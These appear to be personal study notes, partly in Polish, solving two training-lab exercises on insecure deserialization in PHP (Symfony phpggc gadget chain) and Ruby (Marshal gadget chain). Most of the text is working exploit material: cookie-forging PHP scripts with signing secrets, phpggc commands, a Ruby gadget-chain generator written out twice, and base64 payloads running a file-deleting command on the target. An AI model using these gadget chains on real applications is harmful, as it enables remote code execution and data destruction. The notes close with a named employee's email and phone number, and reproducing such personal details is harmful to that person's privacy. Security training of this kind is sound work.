Deserialisation 2 – PROBLEMY z „”

<br>
  php actions
  
  )
) {
]);
 || $action == 
add_foreign_key
add_primary_key
add_unique_key
create_index
) currentLocks(true);
) currentProcesses(true);
dobrowsefk
) dosubTree();
) doSubTree();
) doSubTree($_REQUEST[
) doTree();
find
locks
 or $action == 
processes
refresh_locks
refresh_processes
save_add_foreign_key
save_add_primary_key
save_add_unique_key
save_create_index
subtree
tree
what

  
  <br>
  session.php
  
<?php
$secret = "ibsgxwlkql0hkfqem60t90vtdoz7pv5m";
$token = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$cookie = urlencode('{"token":"'.$token.'", "sig_hmac_sha1":"'.hash_hmac('sha1', $token, $secret).'"}');
echo $cookie;

  
  <br>

  rubyID.rd
  
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
  require "base64"
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)

  <br>

Lab: Exploiting PHP deserialization with a pre-built gadget chain

1.	Login
2.	Change signature sha1 in cookie 
3.	500: ponieważ signature na serwerze się nie zgadza > mamy error z Symphony 4.3.6
4.	GITHUB repo: git clone https://github.com/ambionics/phpggc     
cd phpggc      
./pgpggc -l
./phpggc -i Symfony/RCE4
 
5.	sudo ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt'|base64 -w 0       -> jeśli wgramy w miejsce token to nadal będzie 500, bo mamy zły signature, nie zgodny z serwerem
6.	https://web-security.com/cgi-bin/phpinfo.php
 
7.	Teraz mamy token i secret
8.	Fileof finalcookie: session.php
<?php
$secret = "lxorvb38sw5nsljcl9eo5uxl33s7l3o3";
$token = "TmFtZSAgICAgICAgICAgOiBTeW1mb255L1JDRTQKVmVyc2lvbiAgICAgICAgOiAzLjQuMC0zNCwgNC4yLjAtMTEsIDQuMy4wLTcKVHlwZSAgICAgICAgICAgOiBSQ0U6IEZ1bmN0aW9uIENhbGwKVmVjdG9yICAgICAgICAgOiBfX2Rlc3RydWN0CkluZm9ybWF0aW9ucyAgIDogCkV4ZWN1dGUgJGZ1bmN0aW9uIHdpdGggJHBhcmFtZXRlciAoQ1ZFLTIwMTktMTg4ODkpCgpFUlJPUjogSW52YWxpZCBhcmd1bWVudHMgZm9yIHR5cGUgIlJDRTogRnVuY3Rpb24gQ2FsbCIgCi4vcGhwZ2djIFN5bWZvbnkvUkNFNCA8ZnVuY3Rpb24+IDxwYXJhbWV0ZXI+Cg==";
$cookie = urlencode('{"token":"'.$token.'", "sig_hmac_sha1":"'.hash_hmac('sha1', $token, $secret).'"}');
echo $cookie;

9.	Terminal: php session.php


Lab: Exploiting Ruby deserialization using a documented gadget chain
1.	rubyID.rd  (kernel) https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
2.	browser > network > proxy > manual 8080 also use https
3.	terminal: ruby rubyID.rd
4.	w cookies

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
  require 'base64'
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
5.	echo „BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
6.	OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
7.	b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
8.	ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
9.	YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
10.	bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
11.	aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
12.	LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==”|tr -d „\n”



instalacja ruby
  161  rbenv --version\nwhich ruby
  162  rbenv install 2.7.8\nrbenv global 2.7.8
  163  rbenv global 2.7.8\nrbenv rehash
  164  ruby -v\nwhich ruby\n``
  165  gem -v
  166  ruby rubyID.rd
                         


Młodsza Specjalistka ds. Bezpieczeństwa IT
Departament Zarządzania IT
LUX MED Sp. z o.o., ul. Szturmowa 2, 02-678 Warszawa
katarzyna.sokolowska1@luxmed.pl
tel. 602 790 650

